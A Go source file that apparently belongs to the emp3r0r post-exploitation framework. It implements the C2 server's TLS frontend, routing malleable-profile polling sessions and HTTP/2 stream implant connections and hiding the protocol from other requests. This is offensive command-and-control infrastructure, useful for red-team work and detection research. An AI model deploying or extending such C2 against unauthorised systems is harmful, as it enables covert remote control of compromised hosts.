package server

import (
	"fmt"
	"net/http"
	"time"

	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/network"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

// newC2TLSHandler builds the TLS frontend router. h2Wrapper/h2Err describe the
// optional h2conn backend (nil/error when the build excludes it); http_poll is
// always routed.
func newC2TLSHandler(h2Wrapper transport.C2ChannelWrapper, h2Err error) http.Handler {
	mux := http.NewServeMux()
	registerPreflightFeature(mux)
	c2Path := c2HTTPPollPath()

	mux.HandleFunc("/", func(w http.ResponseWriter, req *http.Request) {
		// http_poll carriers are the malleable session header/cookie. Route
		// them first so an HTTPS http_poll client is not mistaken for h2conn
		// when Go negotiates HTTP/2 on the TLS connection.
		if transport.HTTPServerSessionID(req, &live.GetRuntimeConfig().MalleableC2) != "" {
			if req.URL.Path != c2Path {
				transport.WriteBareStatus(w, http.StatusNotFound)
				return
			}
			handleC2HTTPPoll(w, req)
			return
		}

		// A sessionless POST is an h2conn duplex stream. Its URL may carry a
		// route path (MsgAPI etc.), so do not restrict it to the root.
		if h2Err != nil || h2Wrapper == nil || req.Method != http.MethodPost {
			transport.WriteBareStatus(w, http.StatusMethodNotAllowed)
			return
		}
		if !allowClientRequest(req) {
			logging.Warningf("C2 TLS frontend: rate limit exceeded for %s", req.RemoteAddr)
			transport.WriteBareStatus(w, http.StatusTooManyRequests)
			return
		}

		conn, err := h2Wrapper.Accept(w, req)
		if err != nil {
			logging.Errorf("C2 TLS frontend: h2conn accept failed from %s: %v", req.RemoteAddr, err)
			transport.WriteBareStatus(w, http.StatusInternalServerError)
			return
		}
		stream := transport.NewStreamTransport(conn, req.RemoteAddr)
		cborStreamAccept(stream)
	})
	return mux
}

// StartC2TLSStreamServer starts the TLS frontend. It terminates TLS once and
// routes requests to the backend that owns them, exactly like an nginx/CDN
// frontend would:
//
//   - a request carrying the malleable http_poll session header/cookie goes to
//     the polling backend (HTTP/1.1 or HTTP/2);
//   - a sessionless HTTP/2 POST is an h2conn duplex stream;
//   - everything else is rejected without exposing the protocol.
//
// http_poll is always available here even in builds without with_h2conn; the
// h2conn backend is registered only when its wrapper is compiled in.
func StartC2TLSStreamServer() error {
	h2Wrapper, h2Err := transport.GetC2ChannelWrapper(def.C2ChannelModeH2Conn)
	if h2Err != nil {
		logging.Warningf("C2 TLS frontend: h2conn backend unavailable: %v", h2Err)
	}

	mux := newC2TLSHandler(h2Wrapper, h2Err)

	listener := setupC2TLSListener()
	network.EmpTLSServer = &http.Server{
		Addr:    fmt.Sprintf(":%s", live.GetRuntimeConfig().CCH2Port),
		Handler: mux,
		// Bound slow-header (slowloris) and idle keep-alive connections. Do
		// not set ReadTimeout/WriteTimeout: h2conn and long-polling http_poll
		// both hold a stream open and Go maps those fields to stream deadlines.
		ReadHeaderTimeout: 10 * time.Second,
		IdleTimeout:       120 * time.Second,
	}

	logging.Successf("🚀 Starting C2 TLS frontend at port %s (h2conn + http_poll)", live.GetRuntimeConfig().CCH2Port)
	if err := network.EmpTLSServer.Serve(listener); err != nil {
		if err == http.ErrServerClosed {
			logging.Warningf("C2 TLS frontend is shutdown")
			return nil
		}
		return fmt.Errorf("start C2 TLS frontend at *:%s: %w", live.GetRuntimeConfig().CCH2Port, err)
	}
	return nil
}
